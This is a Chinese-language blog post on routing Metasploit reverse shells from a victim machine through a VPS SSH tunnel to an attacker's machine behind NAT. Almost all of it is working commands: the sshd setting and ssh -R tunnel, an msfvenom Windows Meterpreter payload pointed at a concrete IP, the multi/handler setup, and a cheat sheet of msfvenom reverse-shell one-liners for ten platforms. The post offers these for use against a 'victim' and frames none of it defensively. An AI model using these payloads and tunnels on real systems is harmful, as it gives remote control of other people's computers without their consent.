---
layout:     post
title:      通过 VPS SSH Tunnel 实现内网穿透
author:     wooy0ung
tags: 		msf
category:  	exploit
---


>内网 IP 一般是动态变化的, 直接以内网 IP 的点对点通讯不利于维持控制。
>因此, 必须有一个公网 IP 作为跳板(这里用VPS), 当 Victim 反向连接 VPS时, 进行端口转发, 将
所有流量通过 SSH Tunnel 发送到 Attacker 的机器。  
![](/assets/img/exploit/2017-09-02-vps-ssh-msf/0x00.png)
<!-- more -->


### 0x00 config & open SSH Tunnel

在 /etc/ssh/sshd_config 文件末尾添加

```
GatewayPorts yes
```

打开ssh隧道

```
$ ssh -N -R 9000:192.168.1.116:9000 root@VPS_IP
```


### 0x01 make payload & exploit

生成 x86 Windows payload

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=188.166.209.119 LPORT=9000 -f exe > run.exe
```

start msf

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 0.0.0.0
msf exploit(handler) > set lport 9000
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j
```

测试 ssh Tunnel 是否畅通

```
$ tcping VPS_IP 9000
```

msf弹出提示信息, 端口转发正常

![](/assets/img/exploit/2017-09-02-vps-ssh-msf/0x01.png)

在 Victim's Machine 上执行 payload, getshell~

![](/assets/img/exploit/2017-09-02-vps-ssh-msf/0x02.png)


### 0x02 后记: msfvenom生成各类payload命令

```
Linux: 
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=IP lport=PORT -f elf > shell.elf

Windows: 
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f exe > shell.exe

Mac: 
msfvenom -p osx/x86/shell_reverse_tcp lhost=IP lport=PORT -f macho > shell.macho

PHP: 
msfvenom -p php/meterpreter_reverse_tcp lhost=IP lport=PORT -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP: 
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f asp > shell.asp

JSP: 
msfvenom -p java/jsp_shell_reverse_tcp lhost=IP lport=PORT -f raw > shell.jsp

WAR: 
msfvenom -p java/jsp_shell_reverse_tcp lhost=IP lport=PORT -f war > shell.war

Python: 
msfvenom -p cmd/unix/reverse_python lhost=IP lport=PORT -f raw > shell.py

Bash:
msfvenom -p cmd/unix/reverse_bash lhost=IP lport=PORT -f raw > shell.sh

Perl: 
msfvenom -p cmd/unix/reverse_perl lhost=IP lport=PORT -f raw > shell.pl
```